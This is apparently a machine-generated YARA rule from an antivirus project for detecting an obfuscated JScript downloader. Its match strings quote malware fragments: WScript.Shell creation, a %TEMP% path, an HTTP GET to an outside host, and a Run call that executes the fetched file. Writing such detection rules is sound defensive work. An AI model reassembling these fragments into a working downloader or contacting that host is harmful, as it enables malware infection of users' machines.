rule sig_20160427_efd8b0c4673c84944de65687d1f7dd41 {
  meta:
    description = "datamaliciousorder - file 20160427_efd8b0c4673c84944de65687d1f7dd41.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "580f43d5dec09849287d5c610ecc117579ae84b5dc3f59bff14ea22c56fe40ae"

  strings:
    $s1  = "function OilstMwfnb() {return GgkztDhlik[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"IQjynnm" ascii
    $s2  = "function OilstMwfnb() {return GgkztDhlik[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"IQjynnm" ascii
    $s3  = "var GgkztDhlik = function JebtwEtyie() {return PwmviAqktg[QermnWlpng](\"WScript\"+\".Shell\");}(), NlyodEtmib = 11;" fullword ascii
    $s4  = "function FnhlpLlviw(MuptrCmhbv, YiaudBubwv){HdltlGcpyy = HdltlGcpyy * 1; return MuptrCmhbv - YiaudBubwv;};" fullword ascii
    $s5  = "NuecsMzcqu[EawunFosgy](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s6  = "var PwmviAqktg = this[\"WScript\"];" fullword ascii
    $s7  = "function YwzgaCwdrd(){return AklquRqrmr + \"\";};" fullword ascii
    $s8  = "if (NuecsMzcqu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function NgdapHtcnq() {return ((IekzcOsjvk == true) && (IekzcOsjvk == KfwnjPqrty)) ? 1 : HdltlGcpyy;};" fullword ascii
    $s10 = "function VwfsyObjid(){return QermnWlpng;};" fullword ascii
    $s11 = "YizajDqitm = true;" fullword ascii
    $s12 = "var YizajDqitm = false;" fullword ascii
    $s13 = "function YbsskLpeud()" fullword ascii
    $s14 = "function VzqmeFkojt(QhxyiZopuf){GgkztDhlik[\"R\"+\"un\"](QhxyiZopuf, HdltlGcpyy, HdltlGcpyy);};" fullword ascii
    $s15 = "var KfwnjPqrty = false;" fullword ascii
    $s16 = "var TpjvtSyqvj = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "IekzcOsjvk = true; " fullword ascii
    $s18 = "function VvmtdHpqan(LcppbGswpn) {var IdhzgMawee = (1, 2, 3, 4, 5, LcppbGswpn); return IdhzgMawee;};" fullword ascii
    $s19 = "var IekzcOsjvk = false;" fullword ascii
    $s20 = "function EapijWydar(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}